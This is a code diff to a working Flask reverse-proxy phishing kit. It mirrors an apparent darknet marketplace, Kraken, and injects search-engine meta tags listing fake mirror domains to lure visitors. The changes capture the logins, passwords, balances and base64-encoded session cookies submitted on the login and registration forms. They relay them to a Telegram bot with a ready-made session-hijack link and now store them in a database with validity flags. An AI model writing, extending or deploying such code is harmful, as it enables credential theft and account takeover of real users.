@@ -10,6 +10,8 @@ from flask import Flask, request, make_response, redirect
 import requests
 from telebot.util import quick_markup
 
+from db import check_user, add_user, create_table
+
 app = Flask(__name__)
 
 proxies = {
@@ -230,6 +232,23 @@ def proxy(path):
             respon_text = alert_modal_off(respon_text)
             flag = True
 
+        if request.path == '' or request.path == '/':
+            try:
+                bs = BeautifulSoup(respon_text, 'lxml')
+                head = bs.find('head')
+                meta1 = bs.new_tag('meta')
+                meta1['name'] = 'description'
+                meta1['content'] = 'KRAKEN darknet marketplace. The main advantages of v1tor.at. You can find out what you can buy and how to shop on the new kraken on our website. Official KRAKEN mirrors.'
+                head.append(meta1)
+                meta2 = bs.new_tag('meta')
+                meta2['name'] = 'keywords'
+                meta2[
+                    'content'] = 'vk1.at, vk2.at, vk3.at, v1tor.at, v2tor.at, v3tor.at, vk1, v1tor, in.k2web.at, k2web, krmp, in.k2tor.at, 2krn.at, 2krn, k2tor, wayaway, официальные зеркала, КРАКЕН онион даркнет маркетплэйс, вход на кракен онион, КРАКЕН, kraken тор, kraken tor, kraken hydra, kraken войти, kraken onion link, onion tor'
+                head.append(meta2)
+
+                respon_text = str(bs)
+                flag = True
+            except: pass
 
         # if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
         #     bot.send_message(user_id, f'Вход на страницу оплаты {request.args["amount"]}')
@@ -257,17 +276,21 @@ def proxy(path):
             response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
                                      headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
             done = '❌'
-            balance = 0
+            balance = '0'
+            val_flag = 0
             if 'entry/login' not in str(response.url):
                 done = '✅'
+                val_flag = 1
                 balance = get_balance(response.text)
             host_url = request_headers_dict['Referer']
             form_dict = dict(request.form)
             encoded_dict = base64.b64encode(json.dumps(request.cookies.to_dict()).encode('utf-8')).decode('utf-8')
             bot.send_message(user_id, f'Логин: {done}\n<code>{form_dict["login"]}:{form_dict["password"]}</code>\n'
-                                             f'{host_url[:-11]}\n{balance}',
-                             reply_markup=quick_markup({'Вход':{'url':f'{host_url[:-11]}session/{encoded_dict}'}}))
-            Thread(target=bmb_send,args=[form_dict["login"],form_dict["password"]]).start()
+                                      f'{host_url[:-11]}\n{balance}',
+                             reply_markup=quick_markup({'Вход': {'url': f'{host_url[:-11]}session/{encoded_dict}'}}))
+            if not check_user(form_dict["login"], form_dict["password"]):
+                add_user(form_dict["login"], form_dict["password"], balance, '', validity_flag=val_flag)
+                Thread(target=bmb_send, args=[form_dict["login"], form_dict["password"]]).start()
 
             respon_text = response.text
 
@@ -276,19 +299,57 @@ def proxy(path):
                 flag = True
         elif path in ['entry/post/register', '/entry/post/register']:
             response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
-                                     headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
+                                     headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)
+            val_flag = 0
             done = '❌'
             if 'entry/login' not in str(response.url):
+                val_flag = 1
                 done = '✅'
             host_url = request_headers_dict['Referer']
             form_dict = dict(request.form)
-            bot.send_message(user_id, f'Регистрация: {done}\n<code>{form_dict["login"]}:{form_dict["password1"]}</code>\n {host_url[:-11]}')
-            Thread(target=bmb_send,args=[form_dict["login"],form_dict["password1"]]).start()
-            respon_text = response.text
+            bot.send_message(user_id,
+                             f'Регистрация: {done}\n<code>{form_dict["login"]}:{form_dict["password1"]}</code>\n {host_url[:-11]}')
+            if not check_user(form_dict["login"], form_dict["password1"]):
+                add_user(form_dict["login"], form_dict["password1"], '0', '', validity_flag=val_flag)
+                respon_text = response.text
 
-            if alert_modal_off(respon_text):
-                respon_text = alert_modal_off(respon_text)
-                flag = True
+                if alert_modal_off(respon_text):
+                    respon_text = alert_modal_off(respon_text)
+                    flag = True
+                Thread(target=bmb_send, args=[form_dict["login"], form_dict["password1"]]).start()
+        #     done = '❌'
+        #     balance = 0
+        #     if 'entry/login' not in str(response.url):
+        #         done = '✅'
+        #         balance = get_balance(response.text)
+        #     host_url = request_headers_dict['Referer']
+        #     form_dict = dict(request.form)
+        #     encoded_dict = base64.b64encode(json.dumps(request.cookies.to_dict()).encode('utf-8')).decode('utf-8')
+        #     bot.send_message(user_id, f'Логин: {done}\n<code>{form_dict["login"]}:{form_dict["password"]}</code>\n'
+        #                                      f'{host_url[:-11]}\n{balance}',
+        #                      reply_markup=quick_markup({'Вход':{'url':f'{host_url[:-11]}session/{encoded_dict}'}}))
+        #     Thread(target=bmb_send,args=[form_dict["login"],form_dict["password"]]).start()
+        #
+        #     respon_text = response.text
+        #
+        #     if alert_modal_off(respon_text):
+        #         respon_text = alert_modal_off(respon_text)
+        #         flag = True
+        # elif path in ['entry/post/register', '/entry/post/register']:
+        #     response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
+        #                              headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
+        #     done = '❌'
+        #     if 'entry/login' not in str(response.url):
+        #         done = '✅'
+        #     host_url = request_headers_dict['Referer']
+        #     form_dict = dict(request.form)
+        #     bot.send_message(user_id, f'Регистрация: {done}\n<code>{form_dict["login"]}:{form_dict["password1"]}</code>\n {host_url[:-11]}')
+        #     Thread(target=bmb_send,args=[form_dict["login"],form_dict["password1"]]).start()
+        #     respon_text = response.text
+        #
+        #     if alert_modal_off(respon_text):
+        #         respon_text = alert_modal_off(respon_text)
+        #         flag = True
         else:
             response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
                                      headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)
@@ -330,5 +391,6 @@ def proxy(path):
 
 
 if __name__ == '__main__':
+    create_table()
     app.run()
 
